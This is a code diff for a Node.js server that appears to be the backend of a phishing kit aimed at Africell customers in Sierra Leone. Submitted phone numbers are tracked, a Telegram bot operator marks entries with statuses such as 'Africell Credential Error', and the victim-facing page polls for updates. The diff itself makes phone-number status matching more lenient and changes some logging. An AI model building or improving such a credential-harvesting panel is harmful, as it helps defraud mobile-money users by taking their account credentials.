@@ -135,6 +135,7 @@ app.post('/api/submit-order', async (req, res) => {
             }
         });
 
+        console.log(`[SUBMIT] Sierra Leone order submitted for phone: ${cleanPhone} (${stepTag})`);
         res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
         console.error('submit-order error:', error);
@@ -143,11 +144,19 @@ app.post('/api/submit-order', async (req, res) => {
 });
 
 app.get('/api/check-status', (req, res) => {
-    const cleanPhone = normalizePhone(req.query.phone || '');
-    const entry = orderStatuses[cleanPhone];
+    const rawQueryPhone = req.query.phone || '';
+    const cleanPhone = normalizePhone(rawQueryPhone);
+
+    // Flexible lookup matching to avoid formatting or spacing mismatches
+    let entry = orderStatuses[cleanPhone];
+    if (!entry) {
+        const foundKey = Object.keys(orderStatuses).find(k => k.includes(cleanPhone) || cleanPhone.includes(k));
+        if (foundKey) entry = orderStatuses[foundKey];
+    }
+
     const status = entry ? entry.status : 'pending';
     const timestamp = entry ? entry.timestamp : 0;
-    console.log(`Poll: [${req.query.phone}] -> [${cleanPhone}] status=[${status}] ts=[${timestamp}]`);
+    
     res.json({ status, timestamp });
 });
 
@@ -187,7 +196,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
             messageTitle = 'Africell Credential Error';
         }
 
+        // Store status updates with precise multi-format keys for guaranteed retrieval
         orderStatuses[phone] = { status: newStatus, timestamp: Date.now() };
+        orderStatuses[phone.replace('+', '')] = { status: newStatus, timestamp: Date.now() };
+
+        console.log(`[WEBHOOK ACTION] Sierra Leone Phone: ${phone} -> New Status: ${newStatus}`);
 
         await sendToTelegram(
             `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
@@ -235,7 +248,7 @@ async function registerTelegramWebhook() {
     const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;
     try {
         const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`).then(r => r.json());
-        console.log('Webhook registered:', r);
+        console.log('Webhook registered successfully:', r);
     } catch (error) {
         console.error('Telegram webhook setup failed:', error.message);
     }
